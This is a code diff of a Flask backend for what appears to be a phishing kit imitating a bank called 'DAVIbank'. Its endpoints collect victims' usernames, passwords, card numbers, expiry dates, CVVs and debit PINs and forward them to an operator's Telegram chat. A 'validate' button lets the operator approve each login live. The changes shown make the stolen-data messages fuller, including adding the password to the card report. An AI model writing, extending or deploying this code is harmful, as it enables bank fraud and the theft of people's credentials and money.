@@ -1,4 +1,4 @@
-﻿from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
 import json
@@ -11,23 +11,7 @@ ADMIN_CHAT_ID = '6434195233'
 PORT = 3000
 
 app = Flask(__name__)
-
-# Enable CORS for all routes with specific settings
-CORS(app, resources={
-    r"/*": {
-        "origins": "*",
-        "methods": ["GET", "POST", "OPTIONS"],
-        "allow_headers": ["Content-Type", "Authorization"]
-    }
-})
-
-# Add OPTIONS handler for preflight requests
-@app.after_request
-def after_request(response):
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
-    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-    return response
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 pending_validations = {}
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
@@ -54,20 +38,26 @@ def submit_login():
     
     keyboard = {
         "inline_keyboard": [[
-            {"text": "✅ VALIDAR USUARIO", "callback_data": f"validate_{user_id}"}
+            {"text": "✅ VALIDAR ACCESO", "callback_data": f"validate_{user_id}"}
         ]]
     }
     
-    message = (f"🔐 NUEVA SOLICITUD\n\n"
-               f"ID: {user_id}\n"
-               f"Usuario: {username}\n"
-               f"Contraseña: {password}\n"
-               f"Hora: {datetime.now().strftime('%H:%M:%S')}")
+    message = (f"🔐 **NUEVA SOLICITUD DE ACCESO** 🔐\n\n"
+               f"━━━━━━━━━━━━━━━━━━━━━━\n"
+               f"🆔 ID: `{user_id}`\n"
+               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+               f"📋 **DATOS DE ACCESO**\n"
+               f"👤 Usuario: {username}\n"
+               f"🔑 Contraseña: {password}\n\n"
+               f"━━━━━━━━━━━━━━━━━━━━━━\n"
+               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
+               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+               f"⚠️ Presione el botón para validar este acceso")
     
     requests.post(f"{TELEGRAM_API}/sendMessage",
-        json={"chat_id": ADMIN_CHAT_ID, "text": message, "reply_markup": keyboard})
+        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
     
-    return jsonify({"success": True, "userId": user_id})
+    return jsonify({"success": True})
 
 @app.route('/api/check/<user_id>', methods=['GET', 'OPTIONS'])
 def check_validation(user_id):
@@ -84,15 +74,20 @@ def submit_card():
         return jsonify({}), 200
     
     data = request.json
-    message = (f"💳 DATOS DE TARJETA\n\n"
-               f"Usuario: {data.get('username')}\n"
-               f"Tarjeta: {data.get('cardNumber')}\n"
-               f"Expira: {data.get('expiry')}\n"
-               f"CVV: {data.get('cvv')}\n"
-               f"PIN: {data.get('debitPin')}")
+    message = (f"💳 **DATOS DE TARJETA** 💳\n\n"
+               f"━━━━━━━━━━━━━━━━━━━━━━\n"
+               f"👤 Usuario: {data.get('username')}\n"
+               f"🔑 Contraseña: {data.get('password')}\n"
+               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+               f"💳 Tarjeta: {data.get('cardNumber')}\n"
+               f"📅 Expira: {data.get('expiry')}\n"
+               f"🔐 CVV: {data.get('cvv')}\n"
+               f"🏧 PIN: {data.get('debitPin')}\n"
+               f"━━━━━━━━━━━━━━━━━━━━━━\n"
+               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}")
     
     requests.post(f"{TELEGRAM_API}/sendMessage",
-        json={"chat_id": ADMIN_CHAT_ID, "text": message})
+        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown"})
     
     return jsonify({"success": True})
 
@@ -127,10 +122,13 @@ def poll_telegram():
                             
                             if user_id in pending_validations:
                                 pending_validations[user_id]['status'] = 'validated'
-                                print(f"[{datetime.now()}] ✅ Validated: {user_id}")
+                                print(f"[{datetime.now()}] ✅ User validated: {user_id}")
                                 
                                 requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
-                                    json={"callback_query_id": callback['id'], "text": "✅ Usuario validado!"})
+                                    json={"callback_query_id": callback['id'], "text": "✅ Acceso validado!"})
+                                
+                                requests.post(f"{TELEGRAM_API}/sendMessage",
+                                    json={"chat_id": ADMIN_CHAT_ID, "text": f"✅ Usuario {user_id} ha sido validado exitosamente"})
                     
                     if 'message' in update:
                         message = update['message']
@@ -138,23 +136,15 @@ def poll_telegram():
                         text = message.get('text', '')
                         
                         if text == '/start':
-                            welcome_message = (
-                                "🤖 **Bot de validación DAVIbank activo**\n\n"
-                                "Los usuarios serán notificados aquí cuando necesiten validación.\n\n"
-                                "📋 Comandos disponibles:\n"
-                                "/start - Mostrar este mensaje\n"
-                                "/status - Ver estado del bot\n"
-                                "/pending - Ver validaciones pendientes"
-                            )
+                            welcome = ("🤖 Bot de validación DAVIbank\n\n"
+                                      "Los usuarios serán notificados aquí cuando necesiten validación.\n\n"
+                                      "Comandos:\n/status - Ver estado\n/pending - Ver pendientes")
                             requests.post(f"{TELEGRAM_API}/sendMessage",
-                                json={"chat_id": chat_id, "text": welcome_message, "parse_mode": "Markdown"})
+                                json={"chat_id": chat_id, "text": welcome})
                         
                         elif text == '/status':
-                            status_message = (f"📊 Estado del Bot\n\n"
-                                            f"✅ Bot activo\n"
-                                            f"📌 Pendientes: {len(pending_validations)}")
                             requests.post(f"{TELEGRAM_API}/sendMessage",
-                                json={"chat_id": chat_id, "text": status_message})
+                                json={"chat_id": chat_id, "text": f"📊 Pendientes: {len(pending_validations)}"})
         
         except Exception as e:
             print(f"Error: {e}")
@@ -164,9 +154,6 @@ if __name__ == '__main__':
     print("\n" + "="*50)
     print("DAVIbank Bot Starting...")
     print("="*50)
-    print(f"📡 Server: http://0.0.0.0:{PORT}")
-    print(f"🤖 Bot is polling...")
-    print("="*50 + "\n")
     
     poll_thread = threading.Thread(target=poll_telegram, daemon=True)
     poll_thread.start()
